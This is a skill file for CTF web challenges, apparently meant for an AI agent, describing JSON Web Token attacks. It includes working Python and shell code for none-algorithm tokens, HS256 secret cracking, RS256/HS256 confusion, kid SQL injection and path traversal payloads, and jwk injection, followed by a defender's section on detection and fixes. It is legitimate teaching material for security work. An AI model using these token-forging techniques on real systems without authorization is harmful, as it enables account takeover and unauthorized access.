---
name: ctf-web-challenges-jwt-challenges
description: Use when a CTF web challenge uses JSON Web Tokens for
  authentication, or when source shows jwt.encode/jwt.decode calls. Covers
  decoding and inspecting tokens, the none-algorithm attack, weak secret
  brute forcing, RS256 to HS256 algorithm confusion, kid header SQL
  injection and path traversal, jwk and jku header injection, and crafting
  admin tokens with Python. Use when an app sets a JWT cookie, when
  changing the payload grants access, or when source reveals how tokens
  are verified.
version: 1.0.0
domain: ctf
lifecycle: stable
last_verified: 2026-10-23
parent: ctf-web-challenges
requires: [ctf-web-challenges]
extends: []
relates: [web-sqli, ctf-web-challenges]
tools:
  - name: Python
    version: 3.12
  - name: Burp Suite
    version: 2026.2
  - name: curl
    version: 8.5
  - name: John the Ripper
    version: 1.9.0-jumbo
---

JWT challenges test whether you understand how token verification can
fail. The attacks form a short ladder: none algorithm, weak secret,
algorithm confusion, key confusion via `kid`, and trusted-key injection
via `jwk`/`jku`. This sub-skill covers the authorized methodology for
each, with Python snippets for crafting tokens and the exact order to try
them in a competition. Scope is CTF competitions, lab apps, and systems
you have explicit permission to test.

## Quick Workflow

1. Capture a valid token (login, register) and decode header and
   payload; note `alg`, `kid`, `jku`, and claim names.
2. Read the verification code in source when provided; the bug is
   usually one line (`algorithms=["none"]`, hardcoded secret).
3. Try the none algorithm: set `alg` to `none`, empty the signature,
   escalate the claims.
4. If a secret is used, brute force it with a wordlist (HS256 secrets
   in CTFs are weak by design).
5. If `alg` is RS256 and you have the public key, try algorithm
   confusion (sign HS256 with the public key as secret).
6. If a `kid` header exists, test it for SQL injection or path
   traversal in the key lookup.
7. If `jku`/`jwk` are honored, inject your own key.
8. Craft the admin token, replay it, and capture the flag.

## 1. Decoding and baseline crafting

```python
#!/usr/bin/env python3
import base64, json, hmac, hashlib

def b64d(s): return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))
def b64e(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.xxxx"
header, payload, sig = token.split(".")
print("header:", json.loads(b64d(header)))
print("payload:", json.loads(b64d(payload)))

def forge(payload_dict, secret, alg="HS256"):
    h = b64e(json.dumps({"alg": alg, "typ": "JWT"}).encode())
    p = b64e(json.dumps(payload_dict).encode())
    s = b64e(hmac.new(secret, f"{h}.{p}".encode(), hashlib.sha256).digest())
    return f"{h}.{p}.{s}"

# example: escalate role with a known secret
print(forge({"user": "guest", "role": "admin"}, b"secret"))
```

Keep a valid baseline token; every attack is a mutation of it. Test each
forged token with curl against the protected endpoint and diff the
response.

## 2. The none algorithm attack

```python
# strip the signature, set alg to none
h = b64e(json.dumps({"alg": "none", "typ": "JWT"}).encode())
p = b64e(json.dumps({"user": "guest", "role": "admin"}).encode())
none_token = f"{h}.{p}."   # trailing dot, empty signature
print(none_token)
```

```bash
curl -s http://chals.ctf:8000/admin -H "Cookie: token=$NONE_TOKEN" | head -c 300
# variants to try: "none", "None", "NONE" (case handling bugs)
```

This works when the verifier trusts the token's own `alg` claim. Source
tells you instantly: `jwt.decode(t, verify=False)` or an allowlist that
includes `"none"`.

## 3. Weak secret brute force

```bash
# hashcat mode 16500 cracks JWT HS256 secrets from a captured token
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt --force

# or John the Ripper with the jwt2john converter
python3 /usr/share/john/jwt2john.py "$TOKEN" > jwt.hash
john --wordlist=/usr/share/wordlists/rockyou.txt jwt.hash
```

CTF secrets are deliberately weak (`secret`, `password`, `ctf`,
`challenge`, `123456`, the challenge name). Once cracked, forge any
claims with the snippet in section 1. If the wordlist fails quickly,
move on; the intended bug is usually elsewhere on the ladder.

## 4. RS256 to HS256 algorithm confusion

When the app verifies RS256 (asymmetric) but you can get it to accept
HS256 (symmetric), sign with the RSA public key as the HMAC secret.

```python
from cryptography.hazmat.primitives import serialization
import base64, json, hmac, hashlib

# public key from the challenge (often at /.well-known/jwks.json or in source)
pub_pem = open("pubkey.pem", "rb").read()
# use the PEM bytes themselves as the HMAC secret (classic confusion)
secret = pub_pem

def b64e(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
h = b64e(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
p = b64e(json.dumps({"user": "guest", "role": "admin"}).encode())
s = b64e(hmac.new(secret, f"{h}.{p}".encode(), hashlib.sha256).digest())
print(f"{h}.{p}.{s}")
```

Variants: some apps strip PEM headers before using the key as secret;
try the raw base64 body too. Confirm the app actually switches
algorithms (source shows `algorithms=["RS256","HS256"]` or reads `alg`
from the header).

## 5. kid header attacks

The `kid` (key ID) header often selects the verification key from a
database or filesystem, which makes it an injection point.

```bash
# Decode the header first; if kid looks like a filename or DB key, probe:
# SQL injection via kid (when the key lookup is a query)
# header: {"alg":"HS256","kid":"key1"} -> {"alg":"HS256","kid":"' OR '1'='1"}
python3 - <<'EOF'
import base64, json
def b64e(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
h = b64e(json.dumps({"alg":"HS256","kid":"' OR '1'='1' -- "}).encode())
p = b64e(json.dumps({"user":"guest","role":"admin"}).encode())
print(f"{h}.{p}.")
EOF

# Path traversal via kid (when the key is read from a file)
# kid: ../../dev/null  -> empty key, then sign with empty secret
# kid: /proc/self/environ or a known static file whose content you know
```

For file-based `kid`, point it at a file whose content you know (or an
empty file like `/dev/null`), then forge the signature with that known
content as the secret.

## 6. jwk and jku injection

If the verifier trusts `jwk` (embedded key) or `jku` (key URL) headers,
supply your own key.

```python
# Generate an RSA key, embed the public part as jwk, sign with the private part
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
import jwt  # PyJWT
key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
pub = key.public_key()
numbers = pub.public_numbers()
jwk = {"kty": "RSA", "e": str(numbers.e), "n": str(numbers.n),
       "kid": "evil", "alg": "RS256"}
token = jwt.encode({"user": "guest", "role": "admin"}, key, algorithm="RS256",
                   headers={"jwk": jwk, "kid": "evil"})
print(token)
```

For `jku`: host a JWKS file with your key and set `"jku"` to its URL;
this needs the challenge network to allow egress to your host, so check
the rules first.

## Edge cases

- The app checks `exp`/`nbf`: set expiry far in the future when
  forging; a correct signature with an expired claim still fails.
- Multiple audiences (`aud`): copy the exact `aud` value from the
  baseline token into forged tokens.
- The secret is strong and none/confusion fail: the intended bug is
  likely `kid` or `jwk`; do not burn the competition on rockyou.
- Cookies are HttpOnly: you cannot read the token via XSS, but you can
  still set it via response manipulation or just replay forged tokens
  with curl.
- The token is encrypted (JWE), not signed: that is a different
  challenge class (key management, not signature bypass).

## Escalation

- Every ladder step fails: re-read the verification code line by
  line; CTF JWT bugs are sometimes subtle (comparing `role == "admin"`
  after decoding without verifying, accepting expired tokens, using
  `jwt.decode` with `options={"verify_signature": False}`).
- The key is fetched from a URL you cannot control: look for SSRF in
  the `jku` fetch or DNS rebinding if the rules allow; otherwise move
  on, the intended path is elsewhere.
- Token works locally but not remotely: clock skew on `exp`, or the
  remote uses a different secret; re-capture a fresh baseline token
  from the remote.
- Admin endpoint still denies with a valid admin token: the role
  claim may be named differently (`is_admin`, `permissions`); decode
  a real admin token if the challenge leaks one, or enumerate claim
  names from source.

## Detection and defender view

Defenders see JWT attacks as tokens with `alg:none`, unusually young
`iat` with escalated roles, bursts of token submissions (brute force),
and `kid` values containing quotes or `../`. Monitoring for `alg:none`
in production logs is a near-zero false positive detection. Durable
fixes: explicit algorithm allowlist (never trust the token's `alg`),
strong random secrets or proper asymmetric keys, strict `exp`/`aud`
validation, and never using `kid` in a query or file path without
allowlisting.

## Key references

- MITRE ATT&CK T1190 (Exploit Public-Facing Application).
- CWE-287 (Improper Authentication).
- CWE-327 (Use of a Broken or Risky Cryptographic Algorithm):
  algorithm confusion.
- CWE-89 (SQL Injection): via the kid header.
- RFC 7519 (JSON Web Token): https://datatracker.ietf.org/doc/html/rfc7519
- jwt_tool: https://github.com/ticarpi/jwt_tool
